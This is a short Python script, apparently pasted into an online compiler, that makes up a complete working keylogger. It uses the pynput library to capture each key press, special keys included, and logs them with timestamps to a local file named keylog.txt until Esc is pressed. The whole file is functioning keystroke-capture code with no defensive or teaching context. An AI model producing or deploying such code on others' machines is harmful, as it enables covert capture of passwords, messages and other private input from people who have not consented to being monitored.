# Online Python compiler (interpreter) to run Python online.
# Write Python 3 code in this online editor and run it.
from pynput import keyboard
import logging

# Set up logging
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format='%(asctime)s: %(message)s')

def on_press(key):
    """Callback function that logs each key press."""
    try:
        # Log the character of the key
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys
        logging.info(f'Special key pressed: {key}')

def on_release(key):
    """Callback function that stops the keylogger when Esc is pressed."""
    if key == keyboard.Key.esc:
        return False  # Stop the listener

def start_keylogger():
    """Start the keylogger."""
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    start_keylogger()
